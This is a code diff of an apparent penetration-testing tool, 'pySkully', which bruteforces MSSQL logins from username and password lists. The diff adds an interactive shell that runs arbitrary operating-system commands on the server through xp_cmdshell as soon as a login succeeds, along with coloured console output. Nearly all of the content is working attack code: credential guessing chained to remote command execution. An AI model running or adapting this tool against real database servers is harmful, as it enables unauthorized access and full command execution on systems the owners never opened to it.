@@ -1,8 +1,13 @@
+# pySkully
+# A MSSQL service login bruteforcer and xp_cmdshell wrapper
+# Author: Frank Allenby - frank@sensepost.com
+
+import sys
 import argparse
 import _mssql
 
 program_info = {
-    'name': 'sqinner',
+    'name': 'pySkully',
     'description': 'A MSSQL service login bruteforcer xp_cmdshell wrapper',
     'author': {
         'name': 'Frank Allenby',
@@ -15,9 +20,10 @@ program_defaults = {
 }
 
 notices = {
-    'success': '[!]',
-    'fail': '[!]',
-    'info': '[?]'
+    'success': '\033[32m\033[1m[!]\033[0m',
+    'fail': '\033[31m\033[1m[!]\033[0m',
+    'info': '\033[35m\033[1m[?]\033[0m',
+    'break': '\033[37m\033[1m |\033[0m'
 }
 
 
@@ -39,7 +45,7 @@ def notice_info(message):
 
 def print_headline():
     print '''
-    -
+    \033[34m\033[1m-
     | %(name)s
     |
     | %(description)s
@@ -70,9 +76,28 @@ def file_to_array(filename):
         return [line.rstrip('\n') for line in file]
 
 
+
+def shell(conn):
+    whoami = conn.execute_scalar("EXEC master..xp_cmdshell %s", 'whoami')
+    hostname = conn.execute_scalar("EXEC master..xp_cmdshell %s", 'hostname')
+
+    while (1):
+        print '\033[36m%(user)s\033[37m\033[1m@\033[0m\033[32m%(hostname)s\033[37m\033[1m>\033[0m ' % {'user': whoami, 'hostname': hostname},
+        cmd = sys.stdin.readline().rstrip('\n')
+
+        try:
+            conn.execute_query("EXEC master..xp_cmdshell %s;", cmd)
+        except:
+            notice_fail('There was a database error executing your command!')
+
+        for row in conn:
+            if row[0]:
+                print row[0]
+
+
 def brute(usernames, passwords, verbose):
     notice_info('Starting bruteforce with %(username_count)d username(s) and %(password_count)d password(s)' % {'username_count': len(usernames), 'password_count': len(passwords)})
-    print ' |'
+    print notices['break']
     for username in usernames:
         for password in passwords:
             conn = None
@@ -87,8 +112,13 @@ def brute(usernames, passwords, verbose):
                 continue
 
             if verbose:
-                print ' |'
+                print notices['break']
             notice_success('Login succeeded with %(username)s : %(password)s' % {'username': username, 'password': password})
+            print notices['break']
+            notice_info('Dropping into shell..')
+            print notices['break']
+
+            shell(conn)
 
 
 # Convert an argument to an array
